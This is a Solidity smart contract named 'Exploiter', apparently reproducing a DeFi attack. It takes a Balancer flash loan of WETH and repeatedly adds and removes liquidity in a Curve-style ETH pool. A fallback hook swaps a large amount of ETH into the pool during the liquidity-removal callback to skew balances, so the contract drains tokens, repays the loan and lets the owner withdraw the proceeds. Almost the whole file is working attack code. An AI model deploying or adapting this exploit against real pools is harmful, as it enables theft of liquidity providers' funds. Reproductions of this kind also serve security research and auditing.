//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
import "@balancer-labs/v2-interfaces/contracts/vault/IFlashLoanRecipient.sol";

interface IPool {
    function remove_liquidity(uint256 _amount, uint256[2] memory min_amounts, bool use_eth) external;
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount, bool use_eth) external payable returns(uint256);
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth) external payable returns(uint256);
    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external returns(uint256);
    function balances(uint256 arg0) external returns(uint256);
}

contract Exploiter is Ownable, IFlashLoanRecipient  {

    IVault constant vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IPool pool;
    bool flag = false;

    function execute(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external onlyOwner {
        vault.flashLoan(this, tokens, amounts, userData); // take flashloan
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory ,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault));
        (address _pool, address _poolToken, address _token ) = abi.decode(userData, (address, address, address));

        pool = IPool(_pool);
        IERC20 poolToken = IERC20(_poolToken);
        IWETH weth = IWETH(address(tokens[0]));
        IERC20 token = IERC20(_token);
        
        // unwrap loaned ether 
        weth.withdraw(amounts[0]);
        // approve max CRV to the pool
        token.approve(_pool, 2**256 - 1);

        uint poolBalance;
        uint tokenBalance;
        uint loopCount = 58;
        for (uint256 index = 0; index < loopCount; index++) {
            pool.add_liquidity{value: 1e18}([uint(1e18), uint(0)], 0, true);    // just add some eth
            poolBalance = poolToken.balanceOf(address(this)); 
            pool.remove_liquidity(poolBalance, [uint(0), uint(0)], true);   // here comes the function call in fallback and flag switching to prevent calls in fallback for functions below
            // poolBalance = poolToken.balanceOf(address(this));    // commented codelines repeat behaviour of original contract
            // pool.remove_liquidity_one_coin(poolBalance, 0, 0, true);
            tokenBalance = token.balanceOf(address(this));
            pool.exchange(1, 0, index < loopCount - 1 ? tokenBalance : tokenBalance / 4, 0, true);  // and swap back to ether. In case if we want to drain CRV tokens, we may not swap in last loop at all
            flag = false;   // reset the flag in fallback
        }
        // wrap eth back and repay the loan
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(vault), amounts[0]);

    }

    function withdraw(address _to, IERC20 token) external onlyOwner {
        uint balance = token.balanceOf(address(this));
        token.transfer(_to, balance);
    }

    fallback (bytes calldata ) external payable returns (bytes memory _output){
        if (msg.sender == address(pool) && flag == false) {
            // pool.add_liquidity{value: 400e18}([ uint(400e18), uint(0)], 0, true);
            pool.exchange{value: 190e18}(0, 1, 190e18, 0, true);    // push some significant amount of eth in the pool
            flag = true;
        }
        return "";
    }
}